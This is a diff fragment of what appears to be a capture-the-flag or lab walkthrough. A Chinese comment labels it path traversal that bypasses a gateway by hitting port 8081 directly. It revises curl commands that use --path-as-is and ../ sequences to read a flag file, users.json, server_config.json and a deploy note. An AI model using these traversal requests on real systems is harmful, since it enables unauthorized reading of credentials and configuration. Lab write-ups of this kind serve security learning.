@@ -100,9 +100,9 @@ cat server_migration.bak
 
 # 路徑穿越讀取敏感檔案（直打 Port 8081 繞過 Gateway）
 curl -s --path-as-is "http://$TARGET:8081/assets-library/../../../site-b-dev/configs/deploy_note.txt"
-curl -s --path-as-is "http://$TARGET:8081/assets-library/../../config/secret_flag.txt"
-curl -s --path-as-is "http://$TARGET:8081/assets-library/../../config/users.json"
-curl -s --path-as-is "http://$TARGET:8081/assets-library/../../config/server_config.json"
+curl -s --path-as-is "http://$TARGET:8081/assets-library/../config/secret_flag.txt"
+curl -s --path-as-is "http://$TARGET:8081/assets-library/../config/users.json"
+curl -s --path-as-is "http://$TARGET:8081/assets-library/../config/server_config.json"
 ```
 
 ---
